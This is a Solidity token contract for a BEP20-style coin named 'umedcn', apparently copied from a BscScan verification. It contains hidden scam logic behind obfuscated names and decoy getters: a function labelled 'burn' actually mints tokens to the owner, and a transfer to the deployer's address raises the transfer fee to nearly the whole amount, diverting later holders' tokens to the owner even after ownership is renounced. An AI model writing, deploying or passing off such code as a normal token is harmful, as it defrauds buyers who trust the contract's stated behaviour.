/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract akFzdlKB {
address private  bOPdZS = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant KGNGRL = 99999;
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 private  GAixtO = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address private  VLSFJa = address(0);
address private  jIcsQj = address(0);
uint256 private  gnyHHT = 100000000;
uint256 private  gAYMIj = 10000000000;
string public  symbol = "umedcn";
event Transfer(address indexed from, address indexed to, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  OcDPNO = address(0);
address public owner;
uint256 private  jkiiqd = 1000000000000000;
uint256 private  hgTKkP = 10000000000000;
address private  MYkOWe = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "umedcn";
uint256 private  Piqqcb = 1000000000000000000;
uint256 private  pdJobA = 1000000000000000000000;
address private  WMHjeZ = address(0);
address private  lTkWRk = address(0);
address private  kNelHC = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  MPseeV = address(0);
function _getjkiiqd() private returns (uint256) {
return jkiiqd;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _getlTkWRk() private returns (address) {
return lTkWRk;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getOcDPNO() private returns (address) {
return OcDPNO;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "fbFfga");
require(to != address(0), "fbFfga");
require(amount <= balanceOf[from], "fbFfga");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KGNGRL/Piqqcb ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==VLSFJa){
Piqqcb = KGNGRL+2;
}
emit Transfer(from, to, transferAmount);
}




function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getMYkOWe() private returns (address) {
return MYkOWe;
}

function _getpdJobA() private returns (uint256) {
return pdJobA;
}

function _getgnyHHT() private returns (uint256) {
return gnyHHT;
}

function _gethgTKkP() private returns (uint256) {
return hgTKkP;
}



function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getjIcsQj() private returns (address) {
return jIcsQj;
}





function _getkNelHC() private returns (address) {
return kNelHC;
}

function _getWMHjeZ() private returns (address) {
return WMHjeZ;
}







function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tfbFfga 0");
require(spender != address(0), "ffbFfga 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getMPseeV() private returns (address) {
return MPseeV;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _getgAYMIj() private returns (uint256) {
return gAYMIj;
}



function _getGAixtO() private returns (uint256) {
return GAixtO;
}

function _getbOPdZS() private returns (address) {
return bOPdZS;
}





constructor () {
VLSFJa = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}